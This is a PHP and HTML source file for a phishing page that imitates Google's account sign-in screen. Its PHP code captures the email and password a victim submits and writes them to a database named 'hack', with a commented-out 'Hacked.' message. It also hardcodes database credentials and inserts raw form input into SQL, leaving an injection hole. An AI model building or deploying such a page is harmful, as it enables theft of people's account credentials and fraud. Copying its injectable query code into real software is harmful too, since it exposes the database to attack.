<?php

$server = "localhost";
$user = "Elecsware";
$pass = "elcs3630";
$db = "hack";
$table = "google";

$conn = new mysqli($server,$user,$pass,$db);

//include "Server Connection.php";

if(isset($_POST['submit'])){
    $Email = ($_POST['Email']);
    $password = ($_POST['password']);

//echo "$Email ","$password";

$mysql = "INSERT INTO $table (`Email`,`password`) VALUES ('$Email','$password')";

if ($conn->query($mysql) === TRUE){
   //echo "Hacked.";
   header ("Location:Result.php");
}else{
   // echo "error!";
}
}

?>

<!DOCTYPE html>  
 <html lang="en">  
  <head>  
  
   <meta charset="UTF-8" />  
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />  
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />  
   <title>Google Account Sign In</title>  
   <link rel="stylesheet" href="style.css" />  
   <!-- Compiled and minified CSS -->  
   <link  
    rel="stylesheet"  
    href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css"  
   />  
   <!-- Compiled and minified JavaScript -->  
   <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>  
  </head>  
  <body>  

   <div class="login-div">  
    <div class="row">  
    <br>
    <br>
    <br>
      <center> 
         <img src="Google.png" width="125"> 
        </center>
     </div>  
    
    <div class="row center">  
     <h5>Sign in</h5>  
     <h6>Use your Google Account</h6>  
    </div> 
    <form action="" method="post" enctype="multipart/form-data"> 
      
    <div class="row">  
    <div class="input-field col s12">  
    <input id="email_input" type="email" name = "Email" class="validate" style="border-color:#4c8bf5;"/>  
      <label for="email_input">Email</label> 
     </div>  
    </div>  
    <div class="row">  
     <div class="input-field col s12">  
      <input id="password_input" type="password" name= "password" class="validate" style="border-color:#4c8bf5;"/>  
     <label for="password_input">Password</label> 
      <div>  
       <a href="#"><b style="font-color:#4c8bf5;">Forgot Password</b></a>  
      </div>  
     </div>  
     <div class="row">  
      <div class="col s12">  
       Not your computer? Use a private window to sign in.  
       <a href="#"><b>Learn more</b></a>  
      </div>  
     </div>  
     <div class="row"></div>  
     <div class="row">  
      <div class="col s6" style="font-color:#4c8bf5;"><a href="#" style="font-color:#4c8bf5;"><p>Create account</p></a></div>  
      <div class="col s6 right-align">  
       <input type="submit" class="waves-effect waves-light btn" value ="Login" name = "submit" id="login" style="background-color:#4c8bf5;"> 
</form>
      </div>  
     </div>  
    </div>  
   </div>  
  </body>  
 </html>  

 <style>

p{
    color:#4c8bf5;
}
b{
    color:#4c8bf5;
}

#login{
    color:white;
}

body{  
   height: 100vh;  
   width: 100vw;  
   margin: 0;  
   padding: 0;  
   display: flex;  
   align-items: center;  
   justify-content: center;  
 }  
 .login-div{  
    height:590px;
   max-width: 300px;  
   padding:10px;
   padding-top:-10px;  
   border: 1px solid #ddd;  
   border-radius: 8px;  
 }  
 .logo{  
   background: url(./circle-cropped (1).png);  
   background-position: center;  
   background-repeat: no-repeat;  
   background-size: cover;  
   width: 100px;  
   height: 100px;  
   margin: 0 auto;  
   border-radius: 50%;  
 }  

</style>

